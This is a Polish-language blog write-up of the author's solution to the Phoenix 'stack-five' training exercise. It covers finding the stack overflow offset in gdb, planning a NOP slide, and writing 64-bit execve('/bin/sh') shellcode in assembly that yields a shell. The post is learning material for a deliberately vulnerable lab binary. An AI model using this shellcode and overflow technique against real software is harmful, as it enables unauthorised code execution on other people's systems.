---
title: "Phoenix: Stack Five - czyli jak spędzić pół roku nad jednym crackme"
category: pl
tags: binary-exploitation
---

*Gdybym miałbym wybrać pracę   
za dowolnie jaką płacę   
chciałbym zostać pentesterem   
hackować NASA moim tosterem*

Jak to piszę jest godzina 23:33 zimowego czasu polskiego - poszedłbym już 
sobie słodko spać gdyby nie fakt, że mam już prawie ukończone hackme, które
jest moim nemesis - stack5 ze Phoenix (exploit-education). Tego wyzwania podjąłem
się praktycznie zaraz po dowiedzeniu się o nim z jednego z tutoriali LiveOverflow,
czyli jakieś pół roku temu. Nie potrafiąc rozwiązać zadania, rzuciłem je. Teraz,
kiedy wzięło mnie na uczenie się assemblera x86-64, postanowiłem ponownie podejść
do zadania. 

```
Welcome to phoenix/stack-five, brought to you by https://exploit.education
If you’re happy and you know it, segmentation fault. If you’re happy and you know it, segmentation fault. If you’re happy and you know it, and you really want to show it, if you’re happy and you know it, segmentation fault.

Segmentation fault
```

Mając odrobinę wiedzy więcej niż wcześniej, zacząłem od stworzenia
prostego skryptu w pythonie, który generował by mi ciąg kolejnychliter 
alfabetu w zależności od podanej długości

```python
#!/usr/bin/python

import sys
alphabet = 'abcdefghijklmnopqrstuvwyzABCDEFGHIJKLMNOPQRSTUVWYZ'

num = int(sys.argv[1])

for c in alphabet[:num]:
    sys.stdout.write(c*8)
```

Pozwoli mi to łatwo zobaczyć, gdzie są umieszczane dane na stosie.
Jak widać, nie jest to coś skomplikowanego, ale na tą potrzebę starcza.

```
./alphabet.py 16 | ./amd64/stack-five
Segmentation fault
./alphabet.py 15 | ./amd64/stack-five
```

Program się nie wykrzaczył - zapiszę sobie output do jakiegoś pliku,
żeby w vimie przy pomocy `:%!xxd` sobie później dopisać potrzebne dane.

```
mkdir stack5
./alphabet.py 15 > stack5/payload
```

Szybki teścik - `./amd64/stack-five < stack5/payload` działa.
Pora na najlepszego przyjaciela programisty - debuggera. Debugując już `stack-five` 
poraz n-ty, (gdzie n jest liczbą większą od liczby odcinków *Mody na Sukces*) wiem, 
że instrukcja po wywołaniu `gets()` ma adres `start_level+20`

```
(gdb) b *start_level+20
Breakpoint 1 at 0x4005d1
(gdb) r < stack5/payload 
Starting program: /opt/phoenix/amd64/stack-five < stack5/payload
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005d1 in start_level ()
(gdb) x/18xg $rsp
0x7fffffffe5b0:	0x6161616161616161	0x6262626262626262
0x7fffffffe5c0:	0x6363636363636363	0x6464646464646464
0x7fffffffe5d0:	0x6565656565656565	0x6666666666666666
0x7fffffffe5e0:	0x6767676767676767	0x6868686868686868
0x7fffffffe5f0:	0x6969696969696969	0x6a6a6a6a6a6a6a6a
0x7fffffffe600:	0x6b6b6b6b6b6b6b6b	0x6c6c6c6c6c6c6c6c
0x7fffffffe610:	0x6d6d6d6d6d6d6d6d	0x6e6e6e6e6e6e6e6e
0x7fffffffe620:	0x6f6f6f6f6f6f6f6f	0x00007fffffffe600
0x7fffffffe630:	0x00007fffffffe650	0x00000000004005f7
(gdb) 
```

Widać tutaj wyraźnie input i trzy jakieś liczby.
Pierwszy wskazuje jakoś na końcówkę bufora, drugi jest wartością poprzedniego
adresu podstawy ramki, trzeci jest adresem powrotu do `main()`.

Po zastąpieniu pierwszej na 0x4141414141414141 (czytaj: 'AAAAAAAA') w sumie nic
ważnego się nie dzieje - niby jest segfault, ale dopiero pod koniec maina.
Następną wartość trzeba by było zmienić na coś sensownego - w przeciwnym wypadku
w trakcie wychodzenia z `start_level` pojawi się znowu segfault. Najlepiej najbliższym
adresem na stos.
Adres powrotu - gwóźdź programu - trzeba nakierować na shellcode, którego wpisaliśmy,
czyli na stos. 

Mechanikę zjeżdżalni można użyć tutaj - zamiast
dokładnego adresu shellcode'u, wstawić adres środka sporego ciągu instrukcji NOP,
na którego końcu jest nasz kod. Mówi się, że NOP nic nie robi, ale pamiętajcie, że
wskaźnik instrukcji sam się nie zinkrementuje. Na końcu tej 'zjeżdżalni' będzie
xCC, czyli instrukcja breakpoint - ta magiczna wartość, która przerywa działanie
programu i oddaje go debuggerowi (no chyba, że go nie ma, wtedy proces jest po
prostu zabijany :> ).
`:%!xxd -r`, `:w` i jedziemy dalej

```
Starting program: /opt/phoenix/amd64/stack-five < stack5/payload
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005d1 in start_level ()
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fffffffe680 in ?? ()
(gdb) 
```

Czuję się niczym magik, mimo, że nie zrobiłem niczego odkrywczego. Co się
stanie gdy będę chciał odpalić ten program poza debuggerem?

`:!./amd64/stack-five < stack5/payload`
```
Welcome to phoenix/stack-five, brought to you by https://exploit.education
/bin/bash: line 1:   603 Trace/breakpoint trap   ./amd64/stack-five < stack5/payload

shell returned 133

Press ENTER or type command to continue
```

Do szczęścia potrzeba tak niewiele :)
Nadszedł czas na amunicję grubego kalibru - własny shellcode. Dlatego, że
mam obraz Phoenix w wersji x86-64, muszę też stworzyć 64-bitową binarkę.

```
bits 64

call  LULZ
db    "/bin/sh", 0
LULZ:
mov   rax, 59
pop   rdi
xor   rsi, rsi
xor   rdx, rdx
syscall
```

Dla niewtajemniczonych:   
`call LULZ` wrzuca na stos adres rzeczy, która jest zaraz za nim i robi skok do LULZ,  
`mov rax, 59` execve() jest numerem odwołaniem systemowym numer 59  
`pop rdi` poprzednio wrzucony "/bin/sh" na stos zostaje zdjęte do rejestru rdi  
`xor rsi, rsi` zerowanie rejestru   
`syscall` - magia

`:!yasm shellcode.asm`
`:read shellcode`
Trzeba pamiętać jeszcze o usunięciu kodu xCC i znaku nowej linii

`r < stack5/payload`
```
Starting program: /opt/phoenix/amd64/stack-five < stack5/payload
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005d1 in start_level ()
(gdb) c
Continuing.
process 614 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
[Inferior 1 (process 614) exited normally]
```

Próba poza gdb niestety zakończyła się niepowodzeniem. Prawdopodobnie zbyt mała
zjeżdżalnia albo zła wartość powrotu. Ale na tym się zatrzymałem za pierwszym
podejściem w tamtym roku, teraz MUSZĘ to zrobić!  
Druga próba - illegal instruction. Coś mi mówi, że jestem blisko.   
Trzecia próba - przesło gładko. Zwiększyłem długość nop slide i troszkę
skorygowałem adres powrotu. NARESZCIE!

```
svu@unassigned:~$ (cat stack5/payload; cat) | ./amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education

whoami
phoenix-amd64-stack-five
id
uid=1000(svu) gid=1000(svu) euid=405(phoenix-amd64-stack-five) egid=405(phoenix-amd64-stack-five) groups=405(phoenix-amd64-stack-five),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),1000(svu)
```

~~hmm... powłoka działa, ale program `stack-five` jest ma setuid, czyli ustawia
proces uruchamia się jako root, czyli powłoka też powinna być roota.~~
Nevermind, tak było w poprzedniku Phoenixa, czyli Protostar, teraz uid jest po
uruchomieniu programu ustawione na `phoenix-amd64-stack-five`

I tak, wiem, że zamiast   
`(cat stack5/payload; cat) | ./amd64/stack-five` mogłem napisać   
`cat stack5/payload - | ./amd64/stack-five`

*[\*LiveOverflow music plays\*](https://youtu.be/HSlhY4Uy8SA?t=729)*

<<EOF
